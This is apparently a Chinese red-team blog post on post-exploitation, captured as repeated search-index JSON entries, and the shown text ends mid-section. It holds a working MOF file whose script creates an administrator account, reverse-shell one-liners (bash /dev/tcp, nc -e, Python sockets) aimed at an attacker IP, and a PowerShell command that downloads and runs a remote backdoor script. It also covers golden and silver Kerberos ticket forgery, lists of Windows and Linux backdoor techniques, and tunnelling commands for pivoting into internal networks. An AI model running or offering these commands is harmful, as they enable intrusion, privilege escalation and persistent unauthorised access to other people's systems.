通过漏洞拉到webshell之后，找到网站配置文件，里面有sa权限的账号密码，配置文件为asp或者aspx网站一般使用微软自带数据库，这个提权没有sa权限是不能做的 mssql一般是允许远程连接的 系统库是master ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:3","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#2udf提权"},{"categories":["hvv"],"content":"\r数据库提权\r1.MOF提权MySQL数据库，Windows\u003c=2003 MOF文件既然每五秒就会执行，而且是系统权限； 我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件； 然后系统每隔五秒就会执行一次我们上传的MOF。 MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权： #pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\") instance of __EventFilter as $EventFilter { EventNamespace = \"Root\\\\Cimv2\"; Name = \"filtP2\"; Query = \"Select * From __InstanceModificationEvent \" \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \" \"And TargetInstance.Second = 5\"; QueryLanguage = \"WQL\"; }; instance of ActiveScriptEventConsumer as $Consumer { Name = \"consPCSV2\"; ScriptingEngine = \"JScript\"; ScriptText = \"var WSH = new ActiveXObject(\\\"WScript.Shell\\\")\\nWSH.run(\\\"net.exe user hacker P@ssw0rd /add\\\")\\nWSH.run(\\\"net.exe localgroup administrators hacker /add\\\")\"; }; instance of __FilterToConsumerBinding { Consumer = $Consumer; Filter = $EventFilter; }; （通常使用msf自带的mof模块来实现提权） 2.UDF提权UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。当我们有读取和写入权限以后，我们就可以尝试使用UDF提权的方法，从数据库的root权限提升到系统的管理员权限 https://blog.csdn.net/qq_43430261/article/details/107258466 3.Mssql提权mssql提权主要分为弱口令与溢出两类提权。目前主要通过弱口令连接直接提权，溢出类Mssql数据库几乎很少见（sqlserver2000之后就几乎没有了）。 通过漏洞拉到webshell之后，找到网站配置文件，里面有sa权限的账号密码，配置文件为asp或者aspx网站一般使用微软自带数据库，这个提权没有sa权限是不能做的 mssql一般是允许远程连接的 系统库是master ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:3","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#3mssql提权"},{"categories":["hvv"],"content":"\r白银票据和黄金票据\r九维团队-红队（突破）| 黄金白银票据攻击与防御 | CTF导航 (ctfiot.com) 黄金票据、白银票据 - 1_Ry - 博客园 (cnblogs.com) ","date":"2023-11-17","objectID":"/hvv_post_penetration/:2:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#白银票据和黄金票据"},{"categories":["hvv"],"content":"\rKerberos认证流程Client 与 AS 的交互, Client 与 TGS 的交互, Client 与 Server 的交互。 黄金票据是伪造TGT，白银票据则是伪造ST ","date":"2023-11-17","objectID":"/hvv_post_penetration/:2:1","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#kerberos认证流程"},{"categories":["hvv"],"content":"\r黄金票据在Kerberos认证中,Client通过AS(身份认证服务)认证后,AS会给Client一个 Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的,所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。而已有了金票后,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修改。 所需条件: 1、域名称 2、域的SID值(用户的sid值去掉最后一个杠的数字就是域sid值) 3、域的KRBTGT账号的HASH 4、伪造任意用户名 （获取域的SID和KRBTGT账号的NTLM HASH的前提是需要已经拿到了域的权限） ","date":"2023-11-17","objectID":"/hvv_post_penetration/:2:2","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#黄金票据"},{"categories":["hvv"],"content":"\r白银票据白银票据就是伪造的ST。 在Kerberos认证的第三部，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key 解密ST,从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份,验证成功就让 Client 访问server上的指定服务了。 所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是伪造的门票只对部分服务起作 所需条件: 1.域名 2.域sid 3.目标服务器名 4.可利用的服务 5.服务账号的NTML HASH 6.需要伪造的用户名 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:2:3","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#白银票据"},{"categories":["hvv"],"content":"\r不同点\r获取的权限不同:金票：伪造的TGT，可以获取任意Kerberos的访问权限 银票：伪造的ST，只能访问指定的服务，如CIFS 认证流程不同金票：同KDC交互，但不同AS交互 银票：不同KDC交互，直接访问Server 加密方式不同金票：由krbtgt NTLM Hash 加密 银票：由服务账号 NTLM Hash 加密 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:2:4","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#不同点"},{"categories":["hvv"],"content":"\r不同点\r获取的权限不同:金票：伪造的TGT，可以获取任意Kerberos的访问权限 银票：伪造的ST，只能访问指定的服务，如CIFS 认证流程不同金票：同KDC交互，但不同AS交互 银票：不同KDC交互，直接访问Server 加密方式不同金票：由krbtgt NTLM Hash 加密 银票：由服务账号 NTLM Hash 加密 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:2:4","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#获取的权限不同"},{"categories":["hvv"],"content":"\r不同点\r获取的权限不同:金票：伪造的TGT，可以获取任意Kerberos的访问权限 银票：伪造的ST，只能访问指定的服务，如CIFS 认证流程不同金票：同KDC交互，但不同AS交互 银票：不同KDC交互，直接访问Server 加密方式不同金票：由krbtgt NTLM Hash 加密 银票：由服务账号 NTLM Hash 加密 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:2:4","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#认证流程不同"},{"categories":["hvv"],"content":"\r不同点\r获取的权限不同:金票：伪造的TGT，可以获取任意Kerberos的访问权限 银票：伪造的ST，只能访问指定的服务，如CIFS 认证流程不同金票：同KDC交互，但不同AS交互 银票：不同KDC交互，直接访问Server 加密方式不同金票：由krbtgt NTLM Hash 加密 银票：由服务账号 NTLM Hash 加密 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:2:4","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#加密方式不同"},{"categories":["hvv"],"content":"\r权限维持\r1.反弹shell nc attackhost:nc -lvp 9999 target:/bin/bash -i \u0026\u003e /dev/tcp/192.168.0.198/9999 \u003c\u00261 netcat nc -e /bin/bash 192.168.0.198 9999 powershell 将ps1放到attackhost上 powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2.webshell① 内存马隐藏 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合 3.系统后门\rWindows① 利用任务计划定时反弹会话 ② 利用开机启动项 ③ 影子账户以及guest账户 ④ 注册表 ⑤ 系统工具后门（shift后门） ⑥ WMI后门 ⑦ DLL劫持 ⑧ 进程注入 Linux① ssh、openssh后门 ② 任务计划 ③ VIM后门 ④ 添加超级用户 ⑤ SUID后门 ⑥ 利用自启动程序 ⑦ rootkit后门 4.利用IIS等服务制作后门常用隧道建立工具 4.1 探测是否出网 ICMP：ping IP； TCP：nc -zv ip 端口； HTTP：curl www.xxx； DNS：nslookup [www.baidu.com] 4.2 网络层常用隧道IPv6隧道 kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。 使用： 首先开启目标机上的IPV6,ipconfig查看ipv6地址 kali：6tunnel -4 80 targetipv6IP 80 #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务； 4.3 传输层常用隧道IOX github：https://github.com/EddieIvan01/iox 使用，比如我们将内网的3389端口转发到我们的attackhost： target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 #-k启用加密 vps:./iox fwd -l *8888 -l 33890 -k 656565 socks代理 修改/etc/proxychains.conf 在本地0.0.0.0:1080启动Socks5服务 ./iox proxy -l 1080 在被控机开启Socks5服务，将服务转发到公网attackhost 在attackhost上转发0.0.0.0:9999到0.0.0.0:1080 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -r 1.1.1.1:9999 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 接着连接内网主机 # proxychains.conf # socks5://1.1.1.1:1080 ​ $ proxychains rdesktop 192.168.0.100:3389 4.4 应用层常用隧道SSH ssh常用参数： -C 压缩传输 -f 后台执行SSH -N 建立静默连接 -g 允许远程主机连接本地用于转发的端口 -L 本地端口转发 -R 远程端口转发 -D 动态转发 -P 指定SSH端口 本地端口转发 攻击机：192.168.1.1 web服务器：192.168.1.2 数据库服务器：192.168.1.3 攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景 攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22 攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 远程转发 攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口 在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1 此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 动态转发 ① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2 ② 本地设置socks代理后即可访问数据库服务器 4.5 DNS（iodine）要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined； ","date":"2023-11-17","objectID":"/hvv_post_penetration/:3:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#权限维持"},{"categories":["hvv"],"content":"\r权限维持\r1.反弹shell nc attackhost:nc -lvp 9999 target:/bin/bash -i \u0026\u003e /dev/tcp/192.168.0.198/9999 \u003c\u00261 netcat nc -e /bin/bash 192.168.0.198 9999 powershell 将ps1放到attackhost上 powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2.webshell① 内存马隐藏 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合 3.系统后门\rWindows① 利用任务计划定时反弹会话 ② 利用开机启动项 ③ 影子账户以及guest账户 ④ 注册表 ⑤ 系统工具后门（shift后门） ⑥ WMI后门 ⑦ DLL劫持 ⑧ 进程注入 Linux① ssh、openssh后门 ② 任务计划 ③ VIM后门 ④ 添加超级用户 ⑤ SUID后门 ⑥ 利用自启动程序 ⑦ rootkit后门 4.利用IIS等服务制作后门常用隧道建立工具 4.1 探测是否出网 ICMP：ping IP； TCP：nc -zv ip 端口； HTTP：curl www.xxx； DNS：nslookup [www.baidu.com] 4.2 网络层常用隧道IPv6隧道 kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。 使用： 首先开启目标机上的IPV6,ipconfig查看ipv6地址 kali：6tunnel -4 80 targetipv6IP 80 #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务； 4.3 传输层常用隧道IOX github：https://github.com/EddieIvan01/iox 使用，比如我们将内网的3389端口转发到我们的attackhost： target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 #-k启用加密 vps:./iox fwd -l *8888 -l 33890 -k 656565 socks代理 修改/etc/proxychains.conf 在本地0.0.0.0:1080启动Socks5服务 ./iox proxy -l 1080 在被控机开启Socks5服务，将服务转发到公网attackhost 在attackhost上转发0.0.0.0:9999到0.0.0.0:1080 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -r 1.1.1.1:9999 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 接着连接内网主机 # proxychains.conf # socks5://1.1.1.1:1080 ​ $ proxychains rdesktop 192.168.0.100:3389 4.4 应用层常用隧道SSH ssh常用参数： -C 压缩传输 -f 后台执行SSH -N 建立静默连接 -g 允许远程主机连接本地用于转发的端口 -L 本地端口转发 -R 远程端口转发 -D 动态转发 -P 指定SSH端口 本地端口转发 攻击机：192.168.1.1 web服务器：192.168.1.2 数据库服务器：192.168.1.3 攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景 攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22 攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 远程转发 攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口 在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1 此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 动态转发 ① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2 ② 本地设置socks代理后即可访问数据库服务器 4.5 DNS（iodine）要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined； ","date":"2023-11-17","objectID":"/hvv_post_penetration/:3:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#1反弹shell"},{"categories":["hvv"],"content":"\r权限维持\r1.反弹shell nc attackhost:nc -lvp 9999 target:/bin/bash -i \u0026\u003e /dev/tcp/192.168.0.198/9999 \u003c\u00261 netcat nc -e /bin/bash 192.168.0.198 9999 powershell 将ps1放到attackhost上 powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2.webshell① 内存马隐藏 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合 3.系统后门\rWindows① 利用任务计划定时反弹会话 ② 利用开机启动项 ③ 影子账户以及guest账户 ④ 注册表 ⑤ 系统工具后门（shift后门） ⑥ WMI后门 ⑦ DLL劫持 ⑧ 进程注入 Linux① ssh、openssh后门 ② 任务计划 ③ VIM后门 ④ 添加超级用户 ⑤ SUID后门 ⑥ 利用自启动程序 ⑦ rootkit后门 4.利用IIS等服务制作后门常用隧道建立工具 4.1 探测是否出网 ICMP：ping IP； TCP：nc -zv ip 端口； HTTP：curl www.xxx； DNS：nslookup [www.baidu.com] 4.2 网络层常用隧道IPv6隧道 kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。 使用： 首先开启目标机上的IPV6,ipconfig查看ipv6地址 kali：6tunnel -4 80 targetipv6IP 80 #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务； 4.3 传输层常用隧道IOX github：https://github.com/EddieIvan01/iox 使用，比如我们将内网的3389端口转发到我们的attackhost： target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 #-k启用加密 vps:./iox fwd -l *8888 -l 33890 -k 656565 socks代理 修改/etc/proxychains.conf 在本地0.0.0.0:1080启动Socks5服务 ./iox proxy -l 1080 在被控机开启Socks5服务，将服务转发到公网attackhost 在attackhost上转发0.0.0.0:9999到0.0.0.0:1080 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -r 1.1.1.1:9999 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 接着连接内网主机 # proxychains.conf # socks5://1.1.1.1:1080 ​ $ proxychains rdesktop 192.168.0.100:3389 4.4 应用层常用隧道SSH ssh常用参数： -C 压缩传输 -f 后台执行SSH -N 建立静默连接 -g 允许远程主机连接本地用于转发的端口 -L 本地端口转发 -R 远程端口转发 -D 动态转发 -P 指定SSH端口 本地端口转发 攻击机：192.168.1.1 web服务器：192.168.1.2 数据库服务器：192.168.1.3 攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景 攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22 攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 远程转发 攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口 在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1 此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 动态转发 ① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2 ② 本地设置socks代理后即可访问数据库服务器 4.5 DNS（iodine）要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined； ","date":"2023-11-17","objectID":"/hvv_post_penetration/:3:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#2webshell"},{"categories":["hvv"],"content":"\r权限维持\r1.反弹shell nc attackhost:nc -lvp 9999 target:/bin/bash -i \u0026\u003e /dev/tcp/192.168.0.198/9999 \u003c\u00261 netcat nc -e /bin/bash 192.168.0.198 9999 powershell 将ps1放到attackhost上 powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2.webshell① 内存马隐藏 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合 3.系统后门\rWindows① 利用任务计划定时反弹会话 ② 利用开机启动项 ③ 影子账户以及guest账户 ④ 注册表 ⑤ 系统工具后门（shift后门） ⑥ WMI后门 ⑦ DLL劫持 ⑧ 进程注入 Linux① ssh、openssh后门 ② 任务计划 ③ VIM后门 ④ 添加超级用户 ⑤ SUID后门 ⑥ 利用自启动程序 ⑦ rootkit后门 4.利用IIS等服务制作后门常用隧道建立工具 4.1 探测是否出网 ICMP：ping IP； TCP：nc -zv ip 端口； HTTP：curl www.xxx； DNS：nslookup [www.baidu.com] 4.2 网络层常用隧道IPv6隧道 kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。 使用： 首先开启目标机上的IPV6,ipconfig查看ipv6地址 kali：6tunnel -4 80 targetipv6IP 80 #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务； 4.3 传输层常用隧道IOX github：https://github.com/EddieIvan01/iox 使用，比如我们将内网的3389端口转发到我们的attackhost： target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 #-k启用加密 vps:./iox fwd -l *8888 -l 33890 -k 656565 socks代理 修改/etc/proxychains.conf 在本地0.0.0.0:1080启动Socks5服务 ./iox proxy -l 1080 在被控机开启Socks5服务，将服务转发到公网attackhost 在attackhost上转发0.0.0.0:9999到0.0.0.0:1080 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -r 1.1.1.1:9999 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 接着连接内网主机 # proxychains.conf # socks5://1.1.1.1:1080 ​ $ proxychains rdesktop 192.168.0.100:3389 4.4 应用层常用隧道SSH ssh常用参数： -C 压缩传输 -f 后台执行SSH -N 建立静默连接 -g 允许远程主机连接本地用于转发的端口 -L 本地端口转发 -R 远程端口转发 -D 动态转发 -P 指定SSH端口 本地端口转发 攻击机：192.168.1.1 web服务器：192.168.1.2 数据库服务器：192.168.1.3 攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景 攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22 攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 远程转发 攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口 在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1 此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 动态转发 ① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2 ② 本地设置socks代理后即可访问数据库服务器 4.5 DNS（iodine）要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined； ","date":"2023-11-17","objectID":"/hvv_post_penetration/:3:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#3系统后门"},{"categories":["hvv"],"content":"\r权限维持\r1.反弹shell nc attackhost:nc -lvp 9999 target:/bin/bash -i \u0026\u003e /dev/tcp/192.168.0.198/9999 \u003c\u00261 netcat nc -e /bin/bash 192.168.0.198 9999 powershell 将ps1放到attackhost上 powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2.webshell① 内存马隐藏 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合 3.系统后门\rWindows① 利用任务计划定时反弹会话 ② 利用开机启动项 ③ 影子账户以及guest账户 ④ 注册表 ⑤ 系统工具后门（shift后门） ⑥ WMI后门 ⑦ DLL劫持 ⑧ 进程注入 Linux① ssh、openssh后门 ② 任务计划 ③ VIM后门 ④ 添加超级用户 ⑤ SUID后门 ⑥ 利用自启动程序 ⑦ rootkit后门 4.利用IIS等服务制作后门常用隧道建立工具 4.1 探测是否出网 ICMP：ping IP； TCP：nc -zv ip 端口； HTTP：curl www.xxx； DNS：nslookup [www.baidu.com] 4.2 网络层常用隧道IPv6隧道 kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。 使用： 首先开启目标机上的IPV6,ipconfig查看ipv6地址 kali：6tunnel -4 80 targetipv6IP 80 #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务； 4.3 传输层常用隧道IOX github：https://github.com/EddieIvan01/iox 使用，比如我们将内网的3389端口转发到我们的attackhost： target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 #-k启用加密 vps:./iox fwd -l *8888 -l 33890 -k 656565 socks代理 修改/etc/proxychains.conf 在本地0.0.0.0:1080启动Socks5服务 ./iox proxy -l 1080 在被控机开启Socks5服务，将服务转发到公网attackhost 在attackhost上转发0.0.0.0:9999到0.0.0.0:1080 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -r 1.1.1.1:9999 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 接着连接内网主机 # proxychains.conf # socks5://1.1.1.1:1080 ​ $ proxychains rdesktop 192.168.0.100:3389 4.4 应用层常用隧道SSH ssh常用参数： -C 压缩传输 -f 后台执行SSH -N 建立静默连接 -g 允许远程主机连接本地用于转发的端口 -L 本地端口转发 -R 远程端口转发 -D 动态转发 -P 指定SSH端口 本地端口转发 攻击机：192.168.1.1 web服务器：192.168.1.2 数据库服务器：192.168.1.3 攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景 攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22 攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 远程转发 攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口 在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1 此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 动态转发 ① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2 ② 本地设置socks代理后即可访问数据库服务器 4.5 DNS（iodine）要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined； ","date":"2023-11-17","objectID":"/hvv_post_penetration/:3:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#windows"},{"categories":["hvv"],"content":"\r权限维持\r1.反弹shell nc attackhost:nc -lvp 9999 target:/bin/bash -i \u0026\u003e /dev/tcp/192.168.0.198/9999 \u003c\u00261 netcat nc -e /bin/bash 192.168.0.198 9999 powershell 将ps1放到attackhost上 powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2.webshell① 内存马隐藏 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合 3.系统后门\rWindows① 利用任务计划定时反弹会话 ② 利用开机启动项 ③ 影子账户以及guest账户 ④ 注册表 ⑤ 系统工具后门（shift后门） ⑥ WMI后门 ⑦ DLL劫持 ⑧ 进程注入 Linux① ssh、openssh后门 ② 任务计划 ③ VIM后门 ④ 添加超级用户 ⑤ SUID后门 ⑥ 利用自启动程序 ⑦ rootkit后门 4.利用IIS等服务制作后门常用隧道建立工具 4.1 探测是否出网 ICMP：ping IP； TCP：nc -zv ip 端口； HTTP：curl www.xxx； DNS：nslookup [www.baidu.com] 4.2 网络层常用隧道IPv6隧道 kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。 使用： 首先开启目标机上的IPV6,ipconfig查看ipv6地址 kali：6tunnel -4 80 targetipv6IP 80 #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务； 4.3 传输层常用隧道IOX github：https://github.com/EddieIvan01/iox 使用，比如我们将内网的3389端口转发到我们的attackhost： target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 #-k启用加密 vps:./iox fwd -l *8888 -l 33890 -k 656565 socks代理 修改/etc/proxychains.conf 在本地0.0.0.0:1080启动Socks5服务 ./iox proxy -l 1080 在被控机开启Socks5服务，将服务转发到公网attackhost 在attackhost上转发0.0.0.0:9999到0.0.0.0:1080 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -r 1.1.1.1:9999 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 接着连接内网主机 # proxychains.conf # socks5://1.1.1.1:1080 ​ $ proxychains rdesktop 192.168.0.100:3389 4.4 应用层常用隧道SSH ssh常用参数： -C 压缩传输 -f 后台执行SSH -N 建立静默连接 -g 允许远程主机连接本地用于转发的端口 -L 